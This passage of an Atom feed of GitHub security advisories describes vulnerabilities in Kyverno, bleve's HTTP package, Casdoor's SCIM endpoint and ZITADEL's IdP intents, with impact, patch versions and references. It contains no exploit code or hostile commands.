<li>The deployment with pods will be create successfully due to not checking subjectRegExp and issuerRegExp fields validation</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Deploying unauthorized kubernetes resources that can lead to full compromise of kubernetes cluster</p>
<h3 id="ps">P.S.</h3>
<p>Problem was discovered by me when testing image sign verifying with keyless signing: 
<a href="https://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279&amp;cid=CLGR9BJU9">https://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279&amp;cid=CLGR9BJU9</a>. Then it was <a href="https://github.com/kyverno/policies/issues/1246">verified</a> and <a href="https://github.com/kyverno/kyverno/pull/12237">fixed</a> by <a href="https://github.com/Mohdcode">Mohcode</a>. But i think it should be registered as security problem such as it allows to bypass part of the verification mechanism and Kyverno users should be aware of it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94">https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29778">https://nvd.nist.gov/vuln/detail/CVE-2025-29778</a></li>
<li><a href="https://github.com/kyverno/policies/issues/1246">https://github.com/kyverno/policies/issues/1246</a></li>
<li><a href="https://github.com/kyverno/kyverno/pull/12237">https://github.com/kyverno/kyverno/pull/12237</a></li>
<li><a href="https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60">https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60</a></li>
<li><a href="https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537">https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537</a></li>
<li><a href="https://github.com/advisories/GHSA-46mp-8w32-6g94">https://github.com/advisories/GHSA-46mp-8w32-6g94</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46mp-8w32-6g94</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-24T19:07:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/blevesearch/bleve/v2] Missing Role Based Access Control for the REST handlers in bleve/http package]]></title>
        <id>https://github.com/advisories/GHSA-9w9f-6mg8-jp7w</id>
        <link href="https://github.com/advisories/GHSA-9w9f-6mg8-jp7w"/>
        <updated>2025-05-08T16:45:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Bleve includes HTTP utilities under bleve/http package, that are used by its sample application. 
(<a href="https://github.com/blevesearch/bleve-explorer">https://github.com/blevesearch/bleve-explorer</a>)
These HTTP methods paves way for exploitation of a node’s filesystem where the bleve index resides, 
if the user has used bleve’s own HTTP (bleve/http) handlers for exposing the access to the indexes. 
For instance, the CreateIndexHandler (http/index_create.go) and DeleteIndexHandler (http/index_delete.go) 
enable an attacker to create a bleve index (directory structure) anywhere where the user running the server 
has the write permissions and to delete recursively any directory owned by the same user account.</p>
<p>Users who have used the bleve/http package for exposing access to bleve index without the explicit 
handling for the Role Based Access Controls(RBAC) of the index assets would be impacted.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><strong>No</strong>. The http package is purely intended to be used for demonstration purposes. 
And bleve is never designed to be handling the RBACs or it was ever advertised to be used in that way. 
Hence the collaborators of this project have decided to stay away from adding any authentication or 
authorization to bleve project at the moment.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>The bleve/http package is mainly for demonstration purposes and it lacks exhaustive validation of the user 
inputs as well as any authentication and authorization measures. 
So it is recommended to not use that in production use cases.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue <a href="https://github.com/blevesearch/bleve/issues">here</a>.</li>
<li>Email us at [mailto:<a href="mailto:security@couchbase.com">security@couchbase.com</a>, <a href="mailto:fts-team@couchbase.com">fts-team@couchbase.com</a>].</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/blevesearch/bleve/security/advisories/GHSA-9w9f-6mg8-jp7w">https://github.com/blevesearch/bleve/security/advisories/GHSA-9w9f-6mg8-jp7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31022">https://nvd.nist.gov/vuln/detail/CVE-2022-31022</a></li>
<li><a href="https://github.com/blevesearch/bleve/commit/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff">https://github.com/blevesearch/bleve/commit/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0470">https://pkg.go.dev/vuln/GO-2022-0470</a></li>
<li><a href="https://github.com/blevesearch/bleve/commit/af9e3111dadfedf9d30f0448506b4a57fecc8550">https://github.com/blevesearch/bleve/commit/af9e3111dadfedf9d30f0448506b4a57fecc8550</a></li>
<li><a href="https://github.com/advisories/GHSA-9w9f-6mg8-jp7w">https://github.com/advisories/GHSA-9w9f-6mg8-jp7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9w9f-6mg8-jp7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-06-03T22:17:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor SCIM User Creation Endpoint scim.go HandleScim authorization in github.com/casdoor/casdoor]]></title>
        <id>https://github.com/advisories/GHSA-8w8f-h4cm-c4pg</id>
        <link href="https://github.com/advisories/GHSA-8w8f-h4cm-c4pg"/>
        <updated>2025-05-06T19:59:55.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability classified as critical was found in Casdoor up to 1.811.0. This vulnerability affects the function HandleScim of the file controllers/scim.go of the component SCIM User Creation Endpoint. The manipulation leads to authorization bypass. The attack can be initiated remotely. Upgrading to version 1.812.0 is able to address this issue. The name of the patch is 3d12ac8dc2282369296c3386815c00a06c6a92fe. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4210">https://nvd.nist.gov/vuln/detail/CVE-2025-4210</a></li>
<li><a href="https://github.com/casdoor/casdoor/commit/3d12ac8dc2282369296c3386815c00a06c6a92fe">https://github.com/casdoor/casdoor/commit/3d12ac8dc2282369296c3386815c00a06c6a92fe</a></li>
<li><a href="https://github.com/casdoor/casdoor/releases/tag/v1.812.0">https://github.com/casdoor/casdoor/releases/tag/v1.812.0</a></li>
<li><a href="https://vuldb.com/?ctiid.307180">https://vuldb.com/?ctiid.307180</a></li>
<li><a href="https://vuldb.com/?id.307180">https://vuldb.com/?id.307180</a></li>
<li><a href="https://vuldb.com/?submit.556201">https://vuldb.com/?submit.556201</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3661">https://pkg.go.dev/vuln/GO-2024-3661</a></li>
<li><a href="https://github.com/advisories/GHSA-8w8f-h4cm-c4pg">https://github.com/advisories/GHSA-8w8f-h4cm-c4pg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8w8f-h4cm-c4pg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-02T18:31:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Allows IdP Intent Token Reuse]]></title>
        <id>https://github.com/advisories/GHSA-g4r8-mp7g-85fq</id>
        <link href="https://github.com/advisories/GHSA-g4r8-mp7g-85fq"/>
        <updated>2025-05-06T19:57:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL offers developers the ability to manage user sessions using the <a href="https://zitadel.com/docs/category/apis/resources/session_service_v2/session-service">Session API</a>. This API enables the use of IdPs for authentication, known as idp intents.</p>
<p>Following a successful idp intent, the client receives an id and token on a predefined URI. These id and token can then be used to authenticate the user or their session.</p>
<p>However, it was possible to exploit this feature by repeatedly using intents. This allowed an attacker with access to the application’s URI to retrieve the id and token, enabling them to authenticate on behalf of the user.</p>
<p>It’s important to note that the use of additional factors (MFA) prevents a complete authentication process and, consequently, access to the ZITADEL API.</p>
<h3 id="patches">Patches</h3>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.0.0">3.0.0</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.9">2.71.9</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.10">2.70.10</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Józef Chraplewski from Nedap for reporting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-g4r8-mp7g-85fq">https://github.com/zitadel/zitadel/security/advisories/GHSA-g4r8-mp7g-85fq</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/b1e60e7398d677f08b06fd7715227f70b7ca1162">https://github.com/zitadel/zitadel/commit/b1e60e7398d677f08b06fd7715227f70b7ca1162</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.10">https://github.com/zitadel/zitadel/releases/tag/v2.70.10</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.9">https://github.com/zitadel/zitadel/releases/tag/v2.71.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.0.0">https://github.com/zitadel/zitadel/releases/tag/v3.0.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46815">https://nvd.nist.gov/vuln/detail/CVE-2025-46815</a></li>
<li><a href="https://github.com/advisories/GHSA-g4r8-mp7g-85fq">https://github.com/advisories/GHSA-g4r8-mp7g-85fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4r8-mp7g-85fq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-06T16:51:16.000Z</published>
    </entry>
</feed>